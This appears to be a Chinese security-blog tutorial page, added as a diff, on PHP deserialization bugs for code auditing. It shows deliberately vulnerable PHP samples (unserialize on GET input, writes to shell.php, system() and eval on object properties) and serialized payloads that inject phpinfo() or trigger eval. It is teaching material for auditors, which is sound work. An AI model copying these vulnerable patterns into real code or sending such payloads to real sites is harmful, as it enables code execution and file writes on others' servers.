@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          代码审计基础之php反序列化 - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>每次比赛都少不了反序列的身影，这不在昨天进行的<code>pwn鼎杯</code>也出了和反序列化有关的题目，于是打算好好的研究一下这块<a id="more"></a></p>
+<h4 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h4><p>这里我们要理解两个函数<code>serialize()</code>和<code>unserialize()</code></p>
+<p><code>serialize:</code> 将一个对象序列化成一个字符串变量. </p>
+<p><code>unserialize:</code> 将字符串重建成一个对象. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $i=<span class="string">"hello,hack"</span>;</span><br><span class="line">	<span class="keyword">public</span> $j=<span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ob = <span class="keyword">new</span> test();</span><br><span class="line">$ob-&gt;i = <span class="string">"hello"</span>;</span><br><span class="line">$se = serialize($ob);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ob对象序列化后:"</span>;</span><br><span class="line"><span class="keyword">echo</span> $se;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$unse = unserialize($se);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"还原后："</span>;</span><br><span class="line"><span class="keyword">echo</span> $unse-&gt;i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ob对象序列化后:O:4:&quot;test&quot;:2:&#123;s:1:&quot;i&quot;;s:5:&quot;hello&quot;;s:1:&quot;j&quot;;i:20;&#125;</span><br><span class="line">还原后：hello</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;i&quot;;s:5:&quot;hello&quot;;s:1:&quot;j&quot;;i:20;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>O</code>代表一个对象，<code>4</code>代表对象名的长度，<code>test</code>为对象名，<code>2</code>表示有两个成员，<code>s</code>表示字符串</p>
+<p><code>s:1:&quot;i&quot;;s:5:&quot;hello&quot;</code>这里可以理解成<code>i=hello</code></p>
+<p><code>s:1:&quot;j&quot;;i:20;</code>这里可以理解成<code>j=20</code>可以看到整形是没有长度这一属性</p>
+<p>从本质上来说，反序列化的数据本身是没有危害的，用户可控数据进行反序列化是存在危害的。 </p>
+<h4 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() &#x2F;&#x2F;使用unserialize时触发</span><br><span class="line">__sleep() &#x2F;&#x2F;使用serialize时触发</span><br><span class="line">__destruct() &#x2F;&#x2F;对象被销毁时触发</span><br><span class="line">__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</span><br><span class="line">__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() &#x2F;&#x2F;把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<p>着重关注以下几个</p>
+<ul>
+<li>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
+<li>析构函数__destruct()：当对象被销毁时会自动调用。</li>
+<li>唤醒函数__wakeup() ：如前所提，unserialize()时会自动调用。</li>
+</ul>
+<p><img src="img/serialize_2.png" alt=""></p>
+<h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>由此可以看到只要使用了一次<code>unserialize</code>后就会自动调用<code>wakeup</code>和<code>destruct</code>,前面说了产生必须建立在数据可控的情况下，下面我们来看看若是漏洞代码在这两个函数里会怎么样</p>
+<h5 id="wakeup-或者-destruct"><a href="#wakeup-或者-destruct" class="headerlink" title="__wakeup()或者 __destruct()"></a>__wakeup()或者 __destruct()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comical</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($obj);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$obj_unser = unserialize($obj);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="comment">// 为显示效果，把这个shell.php包含进来</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如上代码，<code>test</code>可控，传给<code>obj</code>，再反序列化<code>obj</code>因此可以构造恶意代码到<code>shell.php</code></p>
+<p>为了得到我们想要传进去的内容，我们写个<code>php</code>脚本(有点模仿流程的意思)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comical</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj=<span class="keyword">new</span> comical;</span><br><span class="line">$obj-&gt;test=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$obj2=serialize($obj);</span><br><span class="line">print_r($obj2);</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>O:7:&quot;comical&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}</code> </p>
+<p><img src="img/serialize_3.png" alt=""></p>
+<p>可以看到我们的代码已经写到了<code>shell.php</code></p>
+<h5 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L4k3</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comical</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$obj = <span class="keyword">new</span> L4k3(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($obj);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$obj_unser = unserialize($obj);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如上代码，<code>test</code>可控，传入<code>test</code>，<code>unserialize</code>调用<code>wakeup</code>，<code>wakeup</code>中调用<code>construct</code>，把文件写到<code>shell.php</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L4k3</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comical</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$obj = <span class="keyword">new</span> L4k3(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> comical();</span><br><span class="line">$obj-&gt;test=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$obj2=serialize($obj);</span><br><span class="line">print_r($obj2);</span><br></pre></td></tr></table></figure>
+
+<p><img src="img/serialize_4.png" alt=""></p>
+<h5 id="普通成员方法"><a href="#普通成员方法" class="headerlink" title="普通成员方法"></a>普通成员方法</h5><h6 id="利用自带方法"><a href="#利用自带方法" class="headerlink" title="利用自带方法"></a>利用自带方法</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a=<span class="string">"aaa"</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">()</span></span>&#123;</span><br><span class="line">            system(<span class="string">"type $this-&gt;a.txt"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ser = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $obj = unserialize($ser);</span><br><span class="line">    $obj-&gt;c();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里c方法主要是可以读取<code>a.txt</code>利用反序列化我们可以读到同一目录下的所有<code>txt</code>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a=<span class="string">"aaa"</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">()</span></span>&#123;</span><br><span class="line">            system(<span class="string">"type $this-&gt;a.txt"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $obj=<span class="keyword">new</span> Test();</span><br><span class="line">    $obj-&gt;a=<span class="string">"hello"</span>;</span><br><span class="line">    $obj2=serialize($obj);</span><br><span class="line">    print_r($obj2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到<code>O:4:&quot;Test&quot;:1:{s:1:&quot;a&quot;;s:5:&quot;hello&quot;;}</code>把他传给id就读到了<code>hello.txt</code></p>
+<p><img src="img/serialize_5.png" alt=""></p>
+<p>其他的文件也一样只需要在<code>$obj-&gt;a=&quot;hello&quot;;</code>修改即可</p>
+<h6 id="利用重名方法"><a href="#利用重名方法" class="headerlink" title="利用重名方法"></a>利用重名方法</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comical</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> L4k3();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L4k3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"L4k3"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L4k4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> comical();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如上代码，愿意是<code>new</code>一个<code>comical</code>对象，调用<code>construct</code>，<code>new</code>一个<code>L4k3</code>，<code>destruct</code>后输出<code>L4k3</code></p>
+<p>但是我们却可以构造一个序列化对象传给<code>test</code>让其反序列化调用<code>destruct</code>且让其调用<code>L4k4</code>的<code>action</code>就可以造成漏洞利用了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comical</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> L4k4();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L4k4</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $test2=<span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> comical();</span><br><span class="line">$obj2=serialize($obj);</span><br><span class="line">print_r($obj2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到<code>O:7:&quot;comical&quot;:1:{s:4:&quot;test&quot;;O:4:&quot;L4k4&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}}</code></p>
+<p><img src="img/serialize_6.png" alt=""></p>
+<p>利用成功</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>反序列化和序列化重点在数据可控，找到这个点，构造出序列化的参数即可</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2018-08-21</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      
+
+      <a class="tag-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">#代码审计</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
